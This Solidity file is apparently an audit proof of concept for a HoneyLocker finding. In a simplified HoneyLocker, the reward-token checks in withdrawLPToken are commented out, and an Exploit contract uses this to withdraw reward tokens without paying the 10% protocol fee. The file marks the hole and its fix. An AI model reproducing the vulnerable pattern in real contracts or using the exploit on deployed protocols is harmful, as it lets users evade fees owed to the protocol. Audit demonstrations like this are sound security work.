// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  InterPol HoneyLocker — H-01 (Pashov, 2024-12-24)
    withdrawLPToken's reward-token checks are commented out. A reward token
    with protocolFees = 1000 (10%, HoneyQueen.computeFees) leaves through
    withdrawLPToken in full. withdrawERC20 would have paid 100 of every 1000
    to the beekeeper. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HoneyQueen {
    mapping(address => bool) public isRewardToken;
    uint256 public protocolFees = 1000;

    function setIsRewardToken(address token, bool v) external {
        isRewardToken[token] = v;
    }

    function computeFees(uint256 amount) public view returns (uint256) {
        return (amount * protocolFees + 10000 - 1) / 10000;
    }
}

contract Beekeeper {
    Token public lastToken;
    uint256 public lastFees;

    function distributeFees(address, address token, uint256 fees) external {
        lastToken = Token(token);
        lastFees = fees;
    }
}

contract HoneyLocker {
    error HoneyLocker__HasToBeLPToken();
    error HoneyLocker__NotExpiredYet();
    error HoneyLocker__CannotBeLPToken();

    address public owner;
    HoneyQueen public honeyQueen;
    Beekeeper public beekeeper;
    mapping(address => uint256) public expirations;
    mapping(address => bool) public blocked;

    modifier onlyOwnerOrOperator() {
        require(msg.sender == owner, "owner");
        _;
    }

    modifier onlyUnblockedTokens(address token) {
        require(!blocked[token], "blocked");
        _;
    }

    constructor(address _owner, HoneyQueen queen, Beekeeper bee) {
        owner = _owner;
        honeyQueen = queen;
        beekeeper = bee;
    }

    function recipient() public view returns (address) {
        return owner;
    }

    function withdrawLPToken(address _LPToken, uint256 _amountOrId) external onlyUnblockedTokens(_LPToken) onlyOwnerOrOperator {
        // if (honeyQueen.isRewardToken(_LPToken)) revert HoneyLocker__HasToBeLPToken();
        // if (expirations[_LPToken] == 0) revert HoneyLocker__HasToBeLPToken();
        if (block.timestamp < expirations[_LPToken]) revert HoneyLocker__NotExpiredYet(); // [S2]
        try Token(_LPToken).approve(address(this), _amountOrId) {} catch {} // [S5]
        Token(_LPToken).transferFrom(address(this), recipient(), _amountOrId); // @> VULN: [S3] reward-token check is commented out, so the full balance leaves with no fee.
        // FIX: restore `if (honeyQueen.isRewardToken(_LPToken)) revert HoneyLocker__HasToBeLPToken();`
    }

    function withdrawERC20(address _token, uint256 _amount) external onlyUnblockedTokens(_token) onlyOwnerOrOperator {
        if (expirations[_token] != 0) revert HoneyLocker__CannotBeLPToken();
        uint256 fees = honeyQueen.computeFees(_amount);
        require(Token(_token).transfer(recipient(), _amount - fees), "user");
        require(Token(_token).transfer(address(beekeeper), fees), "fee");
        beekeeper.distributeFees(address(0), _token, fees);
    }
}

contract Exploit {
    Token public reward; // nonce 1
    HoneyQueen public queen; // nonce 2
    Beekeeper public beekeeper; // nonce 3
    HoneyLocker public locker; // nonce 4
    uint256 public constant AMOUNT = 1000 ether;

    constructor() {
        reward = new Token("RWD");
        queen = new HoneyQueen();
        beekeeper = new Beekeeper();
        locker = new HoneyLocker(address(this), queen, beekeeper);
        queen.setIsRewardToken(address(reward), true);
        reward.mint(address(locker), AMOUNT);
    }

    function run() external {
        require(queen.isRewardToken(address(reward)), "it is a reward token"); // [S1]
        locker.withdrawLPToken(address(reward), AMOUNT);
        require(reward.balanceOf(address(this)) == AMOUNT, "full reward withdrawn"); // [S4]
        require(reward.balanceOf(address(beekeeper)) == 0, "10% fee was not paid"); // [S6]
    }

    function withdrawHonest() external {
        locker.withdrawERC20(address(reward), AMOUNT);
    }
}
